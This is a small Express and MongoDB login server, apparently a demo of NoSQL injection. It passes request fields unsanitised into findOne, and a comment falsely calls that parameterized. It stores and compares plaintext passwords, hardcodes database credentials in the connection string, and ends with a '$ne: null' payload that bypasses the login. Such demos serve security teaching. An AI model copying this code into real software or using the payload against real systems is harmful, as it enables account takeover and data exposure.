import express from 'express';

import { MongoClient } from 'mongodb';

const app = express();
app.use(express.json());

const client = new MongoClient('mongodb+srv://admin:admin123@cluster0.zphslm3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0');
await client.connect();
const db = client.db('test');
const users = db.collection('users');

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // Using parameterized query with exact match
    const user = await users.findOne({ 
        username: username, 
        password: password 
    });

    console.log('User ', user);

    if (user) {
        res.json({ message: 'Login successful!' });
    } else {
        res.status(401).json({ message: 'Invalid credentials' });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));


/*


An attacker can send the following malicious JSON payload:
{
    "username": { "$ne": null },
    "password": { "$ne": null }
}
The query { username: { $ne: null }, password: { $ne: null } } matches all users.

Test this on Postman - NOSQL-Login-Problem Example
*/